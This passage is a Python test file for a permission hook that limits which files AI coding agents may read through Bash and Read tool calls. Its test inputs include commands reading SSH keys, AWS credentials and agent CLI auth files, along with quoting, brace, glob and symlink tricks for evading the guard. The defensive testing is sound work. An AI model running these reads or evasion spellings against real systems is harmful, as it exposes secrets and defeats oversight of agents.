            self.assertEqual(lines[0]["policy"], "read_manifest_read_guard")

    def test_in_manifest_read_still_auto_approves(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            code, body = self._run(repo_root, "true && cat docs/WORKFLOW.md")
            self.assertEqual(code, 0)
            doc = json.loads(body)
            self.assertEqual(
                doc.get("hookSpecificOutput", {}).get("permissionDecision"), "allow"
            )
            lines = self._log_lines(repo_root)
            self.assertEqual([entry["decision"] for entry in lines], ["allow"])

    def test_nonexistent_target_is_not_blocked(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            code, _ = self._run(repo_root, "cat spec/does_not_exist.md")
            self.assertEqual(code, 0)
            self.assertEqual(self._log_lines(repo_root), [])

    def test_out_of_repo_target_is_not_blocked(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            code, _ = self._run(repo_root, "cat /dev/null")
            self.assertEqual(code, 0)
            self.assertEqual(self._log_lines(repo_root), [])

    def test_out_of_repo_target_is_withheld_from_auto_approve(self) -> None:
        """Not blocked, but not auto-approved either.

        Auto-approval bypasses the harness permission list; the repo-relative
        manifest authorized nothing here, so that list must stay in charge. The
        in-repo twin is auto-approved, which is what makes this a real
        distinction rather than a dead branch.
        """
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            for command in (
                "cat /etc/hostname",
                "cat /etc/*.conf",
                # `~` / `$HOME` spellings: `_resolve_target_path` is literal, so
                # these used to read as the in-repo path `<repo>/~/...`, miss as
                # "nonexistent", and land in the auto-approve.
                "cat ~/.ssh/id_rsa",
                "cat ~/.ssh/*",
                "cat $HOME/.aws/credentials",
                # An unquoted `$` makes the target unprovable at all: the
                # extractor declares `$VAR` operands as residue it cannot see.
                "cat $SOMEVAR/x",
                # ANSI-C quoting: `$'\057etc'` is `/etc`, and the `$` check
                # exempts `$` before a quote unless it is spelled for it.
                "cat $'\\057etc\\057hostname'",
                # A brace expansion mixing an in-repo and an out-of-repo variant
                # is the shape only `_expanded_target_path` decides: the `~` word
                # check does not see it, because the token starts with `{`.
                "cat {~/.ssh/id_rsa,docs/WORKFLOW.md}",
            ):
                code, body = self._run(repo_root, command)
                self.assertEqual(code, 0, msg=command)
                # A plain allow emits no envelope at all; only the auto-approve
                # writes permissionDecision=allow.
                decision = (
                    json.loads(body).get("hookSpecificOutput", {}).get("permissionDecision")
                    if body
                    else None
                )
                self.assertNotEqual(decision, "allow", msg=command)
            for command in (
                "cat docs/WORKFLOW.md",
                "true && cat docs/WORKFLOW.md",
                "cat docs/*.md",
                # `/dev/null` is out-of-repo but reads nothing, and
                # `diff -u /dev/null <file>` is a common real shape.
                "diff -u /dev/null docs/WORKFLOW.md",
            ):
                code, body = self._run(repo_root, command)
                self.assertEqual(code, 0, msg=command)
                self.assertEqual(
                    json.loads(body).get("hookSpecificOutput", {}).get("permissionDecision"),
                    "allow",
                    msg=command,
                )

    def test_quoted_variable_reads_are_withheld_from_auto_approve(self) -> None:
        """bash expands `$HOME` inside double quotes.

        Testing the quote-STRIPPED copy let `cat "$HOME/.aws/credentials"`
        through while rejecting the identical unquoted read — the target is
        equally invisible to `extract_bash_read_targets` in both spellings.
        """
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            for command in (
                'cat "$HOME/.aws/credentials"',
                'cat "$HOME"/.ssh/id_rsa',
                'cat "${HOME}/.ssh/id_rsa"',
                'grep x "$HOME/.aws/credentials"',
                "cat ~-/.ssh/id_rsa",
                "ls -la ~",
            ):
                code, body = self._run(repo_root, command)
                self.assertEqual(code, 0, msg=command)
                decision = (
                    json.loads(body).get("hookSpecificOutput", {}).get("permissionDecision")
                    if body
                    else None
                )
                self.assertNotEqual(decision, "allow", msg=command)
            # A `$` that names no path keeps its auto-approve: a regex anchor,
            # `$?`, `$$`. Withholding those would be pure friction.
            for command in (
                'grep -n "foo$" docs/WORKFLOW.md',
                # A regex anchor in a SINGLE-quoted word: here `$'` closes a word
                # rather than opening one, and treating it as ANSI-C quoting cost
                # four real commands their auto-approve.
                "grep -n 'foo$' docs/WORKFLOW.md",
                r"cat docs/WORKFLOW.md | grep -n '^\$'",
                'echo "EXIT:$?"',
                r'grep -E "\.(py|md)$" docs/WORKFLOW.md',
            ):
                code, body = self._run(repo_root, command)
                self.assertEqual(code, 0, msg=command)
                self.assertEqual(
                    json.loads(body).get("hookSpecificOutput", {}).get("permissionDecision"),
                    "allow",
                    msg=command)

    def test_symlinked_glob_match_is_withheld_like_its_literal_twin(self) -> None:
        """`cat docs/link.txt` and `cat docs/*.txt` must agree.

        Containment was decided on the UNRESOLVED match, so an in-repo symlink
        pointing outside was classified in-repo — the glob form authorized
        against the repo-relative manifest what the literal form withheld.
        """
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(Path(tmp) / "repo", roots=["docs/"])
            (Path(tmp) / "outside.txt").write_text("secret", encoding="utf-8")
            os.symlink(Path(tmp) / "outside.txt", repo_root / "docs" / "link.txt")
            for command in ("cat docs/link.txt", "cat docs/*.txt"):
                code, body = self._run(repo_root, command)
                self.assertEqual(code, 0, msg=command)
                decision = (
                    json.loads(body).get("hookSpecificOutput", {}).get("permissionDecision")
                    if body
                    else None
                )
                self.assertNotEqual(decision, "allow", msg=command)

    def test_glob_escaping_the_repo_is_withheld_from_auto_approve(self) -> None:
        """A glob whose PREFIX is in-repo can still match outside it.

        `docs/*/../../outside.txt` expands to a real out-of-repo file; the
        expanded matches were dropped silently, so the command reached the
        auto-approve with nothing having authorized the path.
        """
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(Path(tmp) / "repo", roots=["docs/"])
            (repo_root / "docs" / "sub").mkdir(parents=True, exist_ok=True)
            (Path(tmp) / "outside.txt").write_text("secret", encoding="utf-8")
            code, body = self._run(repo_root, "cat docs/*/../../../outside.txt")
            self.assertEqual(code, 0)
            decision = (
                json.loads(body).get("hookSpecificOutput", {}).get("permissionDecision")
                if body
                else None
            )
            self.assertNotEqual(decision, "allow")

    def test_read_tool_parity_on_backend_credential_home(self) -> None:
        """Parity: the Read tool never reached these paths, and still does not.

        allowed_read_roots is repo-relative, so an absolute home path can never
        be in it — this pins the property the Bash guard was closing the gap to.
        """
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            for target in (
                str(Path.home() / ".claude.json"),
                str(Path.home() / ".claude" / "settings.json"),
                str(Path.home() / ".codex" / "auth.json"),
                str(Path.home() / ".met-dsl" / "operator_tokens" / "x.txt"),
            ):
                payload = {
                    "orchestration_id": self.ORCH,
                    "repo_root": str(repo_root),
                    "tool_name": "Read",
                    "tool_input": {"file_path": target},
                }
                out = io.StringIO()
                with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": "1"}, clear=False):
                    with redirect_stdout(out):
                        code = cli.main(
                            [
                                "--backend",
                                "claude",
                                "--event",
                                "PreToolUse",
                                "--input-json",
                                json.dumps(payload),
                            ]
                        )
                self.assertEqual(code, 2, msg=target)
                # Pin the REASON, not just the exit code: a block for an
                # unrelated future reason would satisfy the code alone.
                self.assertIn(
                    "read_manifest allowed_read_roots", json.loads(out.getvalue()).get("reason", ""),
                    msg=target)

    def test_backend_credential_read_blocks_before_auto_approve(self) -> None:
        """The one path that must not merely lose the auto-approve, but block."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            for command in ("cat ~/.claude.json", "cat ~/.claude/settings.json"):
                code, body = self._run(repo_root, command)
                self.assertEqual(code, 2, msg=command)
                self.assertIn("backend CLI's credential", json.loads(body).get("reason", ""))

    def test_failed_cd_does_not_disarm_the_guard(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            code, body = self._run(repo_root, "cd nosuchdir; cat spec/private.md")
            self.assertEqual(code, 2)
            self.assertIn("'spec/private.md'", json.loads(body).get("reason", ""))

    def test_cd_prefixed_read_still_blocks(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            code, body = self._run(repo_root, "cd spec && cat private.md")
            self.assertEqual(code, 2)
            self.assertIn("'spec/private.md'", json.loads(body).get("reason", ""))
            # And the in-manifest equivalent still passes.
            self.assertEqual(self._run(repo_root, "cd docs && cat WORKFLOW.md")[0], 0)

    def test_unprovable_residue_is_not_blocked(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            code, _ = self._run(repo_root, "echo spec/private.md | xargs cat")
            self.assertEqual(code, 0)
            self.assertEqual(self._log_lines(repo_root), [])

    def test_glob_target_is_expanded_not_dropped(self) -> None:
        """`cat spec/*.md` names real files: dropping the pattern as "nonexistent"
        would hand it to the read-only auto-approve untouched."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            code, body = self._run(repo_root, "cat spec/*.md")
            self.assertEqual(code, 2)
            reason = json.loads(body).get("reason", "")
            # The block names the matched file, not the pattern.
            self.assertIn("'spec/private.md'", reason)
            self.assertEqual(
                [entry["path"] for entry in self._log_lines(repo_root)], ["spec/private.md"]
            )

    def test_in_manifest_glob_still_allowed(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            code, _ = self._run(repo_root, "cat docs/*.md")
            self.assertEqual(code, 0)
            self.assertEqual([e["decision"] for e in self._log_lines(repo_root)], ["allow"])

    def test_brace_expansion_target_is_expanded_not_dropped(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            (repo_root / "spec" / "private2.md").write_text("x", encoding="utf-8")
            code, body = self._run(repo_root, "cat spec/{private,private2}.md")
            self.assertEqual(code, 2)
            self.assertIn("'spec/private.md'", json.loads(body).get("reason", ""))
            # A range is as lexical as a comma group, and reaches real files.
            (repo_root / "spec" / "p1.md").write_text("x", encoding="utf-8")
            (repo_root / "spec" / "p2.md").write_text("x", encoding="utf-8")
            self.assertEqual(self._run(repo_root, "cat spec/p{1..2}.md")[0], 2)

    def test_brace_expansion_past_the_bound_falls_back_to_a_glob(self) -> None:
        """The expander is bounded; past the bound the real file was never
        checked and the read reached the auto-approve."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            (repo_root / "spec" / "d300").mkdir()
            (repo_root / "spec" / "d300" / "s.md").write_text("x", encoding="utf-8")
            self.assertEqual(self._run(repo_root, "cat spec/d{1..300}/s.md")[0], 2)
            nested = "spec/" + "".join(f"{c}{{1,2}}" for c in "abcdefghi") + "/s.md"
            (repo_root / "spec" / "a2b2c2d2e2f2g2h2i2").mkdir()
            (repo_root / "spec" / "a2b2c2d2e2f2g2h2i2" / "s.md").write_text(
                "x", encoding="utf-8"
            )
            self.assertEqual(self._run(repo_root, f"cat {nested}")[0], 2)

    def test_auto_approvable_reader_outside_manifest_blocks(self) -> None:
        """egrep/fgrep/wc are auto-approvable; unextracted they would execute."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            for command in (
                "egrep SECRET spec/private.md",
                "fgrep -rn SECRET spec",
                "wc -c spec/private.md",
            ):
                with self.subTest(command=command):
                    self.assertEqual(self._run(repo_root, command)[0], 2)

    def test_recursive_grep_without_operand_blocks(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            code, body = self._run(repo_root, "grep -rn SECRET")
            self.assertEqual(code, 2)
            self.assertIn("'.'", json.loads(body).get("reason", ""))
            # `-h` is --no-filename for grep, not --help.
            self.assertEqual(self._run(repo_root, "grep -r -h SECRET")[0], 2)
            # Non-recursive: reads stdin, not the tree.
            self.assertEqual(self._run(repo_root, "grep -n SECRET")[0], 0)

    def test_heredoc_body_does_not_produce_a_false_block(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            code, body = self._run(
                repo_root, "cat > docs/note.md <<EOF\ndiff spec/private.md spec/private.md\nEOF"
            )
            self.assertNotIn("unauthorized read", body)

    def test_broad_glob_is_validated_at_its_literal_prefix(self) -> None:
        """`glob.glob` is unbounded — `/*/*/*/*/*/*` did not finish in 60s, and
        this hook runs on every tool call. Every match lies under the pattern's
        literal prefix, so validating the prefix authorizes exactly the set the
        pattern can reach."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            (repo_root / "spec" / "a" / "b" / "c").mkdir(parents=True)
            (repo_root / "spec" / "a" / "b" / "c" / "deep.md").write_text(
                "x", encoding="utf-8"
            )
            code, body = self._run(repo_root, "cat spec/*/*/*/deep.md")
            self.assertEqual(code, 2)
            self.assertIn("'spec'", json.loads(body).get("reason", ""))
            # An in-manifest prefix still passes.
            (repo_root / "docs" / "x" / "y" / "z").mkdir(parents=True)
            (repo_root / "docs" / "x" / "y" / "z" / "deep.md").write_text(
                "x", encoding="utf-8"
            )
            self.assertEqual(self._run(repo_root, "cat docs/*/*/*/deep.md")[0], 0)

    def test_broad_glob_escaping_its_prefix_is_validated_at_the_root(self) -> None:
        """"Every match lies under the literal prefix" fails once a `..` follows
        a wildcard, so the prefix shortcut would authorize a read outside it."""
        from tools.hooks.cli import _bounded_glob_read_targets

        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            resolved = repo_root.resolve()
            self.assertEqual(
                _bounded_glob_read_targets(
                    repo_root, resolved, "docs/*/../../spec/*/*/*"
                ),
                ([(".", resolved)], []),
            )

    def test_broad_glob_with_a_nonexistent_prefix_is_not_blocked(self) -> None:
        """The prefix fallback must keep the same rule as a literal target: a
        path that is not there leaks nothing."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            self.assertEqual(self._run(repo_root, "cat nosuchdir/*/*/*/x")[0], 0)

    def test_out_of_repo_glob_is_not_walked(self) -> None:
        from tools.hooks.cli import _bounded_glob_read_targets

        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            self.assertEqual(
                _bounded_glob_read_targets(repo_root, repo_root.resolve(), "/*/*/*/*/*/*"),
                ([], ["/*/*/*/*/*/*"]),
            )

    def test_glob_matching_nothing_is_not_blocked(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            code, _ = self._run(repo_root, "cat spec/*.nomatch")
            self.assertEqual(code, 0)
            self.assertEqual(self._log_lines(repo_root), [])

    def test_shell_keyword_fragment_does_not_bypass_the_guard(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            for command in (
                "if true; then cat spec/private.md; fi",
                "for f in x; do cat spec/private.md; done",
                "{ cat spec/private.md; }",
                "(cat spec/private.md)",
            ):
                with self.subTest(command=command):
                    code, _ = self._run(repo_root, command)
                    self.assertEqual(code, 2)

    def test_redirect_target_is_not_treated_as_a_read(self) -> None:
        """The output file is a write; blocking on it would break every
        regenerate turn whose output already exists."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            (repo_root / "spec" / "out.txt").write_text("old", encoding="utf-8")
            code, body = self._run(repo_root, "cat docs/WORKFLOW.md > spec/out.txt")
            # It still meets the write guard (this fixture has no output
            # manifest) — but it must never be rejected as an unauthorized READ
            # of its own output file.
            self.assertNotIn("unauthorized read", body)
            self.assertEqual(
                [entry["path"] for entry in self._log_lines(repo_root)], ["docs/WORKFLOW.md"]
            )

    def test_active_child_return_token_stays_readable_via_bash(self) -> None:
        """The documented record-child-return two-step is a bare `cat` of this
        path; the `$(cat ...)` form is rejected by the Bash tool."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            launches = (
                repo_root / "workspace" / "orchestrations" / self.ORCH / "launches"
            )
            launches.mkdir(parents=True, exist_ok=True)
            token_rel = (
                f"workspace/orchestrations/{self.ORCH}/launches/{self.RUN_ID}.parent_return_token"
            )
            (repo_root / token_rel).write_text("tok", encoding="utf-8")
            code, _ = self._run(repo_root, f"cat {token_rel}")
            self.assertEqual(code, 0)
            # Another child's token is NOT exempt.
            other = (
                f"workspace/orchestrations/{self.ORCH}/launches/other_run.parent_return_token"
            )
            (repo_root / other).write_text("tok", encoding="utf-8")
            self.assertEqual(self._run(repo_root, f"cat {other}")[0], 2)

    def test_block_carries_a_renderable_fix_hint(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            code, body = self._run(repo_root, "true && cat spec/private.md")
            self.assertEqual(code, 2)
            # format_block_reason_with_hint renders only known fields; a hint the
            # agent never sees is not a hint.
            self.assertIn("Note:", json.loads(body).get("reason", ""))

    def test_missing_manifest_with_existing_target_blocks_fail_closed(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=None)
            code, body = self._run(repo_root, "cat docs/WORKFLOW.md")
            self.assertEqual(code, 2)
            self.assertIn("read manifest not found", json.loads(body).get("reason", ""))

    def test_self_manifest_read_is_allowed(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            rel = f"workspace/orchestrations/{self.ORCH}/read_manifests/{self.RUN_ID}.json"
            code, _ = self._run(repo_root, f"cat {rel}")
            self.assertEqual(code, 0)
            self.assertEqual([e["decision"] for e in self._log_lines(repo_root)], ["allow"])

    def test_non_workflow_mode_is_skipped(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            code, _ = self._run(repo_root, "cat spec/private.md", workflow_mode="0")
            self.assertEqual(code, 0)
            self.assertEqual(self._log_lines(repo_root), [])

    def test_block_precedes_write_policy_and_names_the_command(self) -> None:
        """A read block fires even when the command also has a write target."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            code, body = self._run(repo_root, "cat spec/private.md > docs/copy.md")
            self.assertEqual(code, 2)
            detail_reason = json.loads(body).get("reason", "")
            self.assertIn("unauthorized read", detail_reason)

    def test_multiple_targets_allow_then_block(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, roots=["docs/"])
            code, _ = self._run(repo_root, "cat docs/WORKFLOW.md && cat spec/private.md")
            self.assertEqual(code, 2)
            lines = self._log_lines(repo_root)
            self.assertEqual([entry["decision"] for entry in lines], ["allow", "block"])


class ReadDecisionAccessLogTests(unittest.TestCase):
    """Read-tool decisions are recorded in access_logs like Grep/Glob."""

    ORCH = "orch_read_log_001"
    RUN_ID = "child_run_read_log_001"

    def _run_read(self, repo_root: Path, file_path: str):
        payload = {
            "orchestration_id": self.ORCH,
            "repo_root": str(repo_root),
            "tool_name": "Read",
            "tool_input": {"file_path": file_path},
        }
        out = io.StringIO()
        with patch.dict(os.environ, {"METDSL_WORKFLOW_MODE": "1"}, clear=False):
            with redirect_stdout(out):
                code = cli.main(
                    [
                        "--backend",
                        "claude",
                        "--event",
                        "PreToolUse",
                        "--input-json",
                        json.dumps(payload),
                    ]
                )
        return code, out.getvalue().strip()

    def test_allow_and_block_are_both_logged(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch_root = repo_root / "workspace" / "orchestrations" / self.ORCH
            (orch_root / "read_manifests").mkdir(parents=True, exist_ok=True)
            (orch_root / "access_logs").mkdir(parents=True, exist_ok=True)
            (orch_root / "active_child_agent_run_id.txt").write_text(self.RUN_ID, encoding="utf-8")
            (orch_root / "read_manifests" / f"{self.RUN_ID}.json").write_text(
                json.dumps({"allowed_read_roots": ["docs/"]}), encoding="utf-8"
            )
            self.assertEqual(self._run_read(repo_root, "docs/WORKFLOW.md")[0], 0)
            self.assertEqual(self._run_read(repo_root, "tools/hooks/cli.py")[0], 2)
            lines = [
                json.loads(line)
                for line in (orch_root / "access_logs" / f"{self.RUN_ID}.jsonl")
                .read_text(encoding="utf-8")
                .splitlines()
                if line.strip()
            ]
            self.assertEqual([entry["decision"] for entry in lines], ["allow", "block"])
            self.assertEqual({entry["tool"] for entry in lines}, {"Read"})
            self.assertEqual(lines[1]["policy"], "read_manifest_read_guard")


if __name__ == "__main__":
    unittest.main()
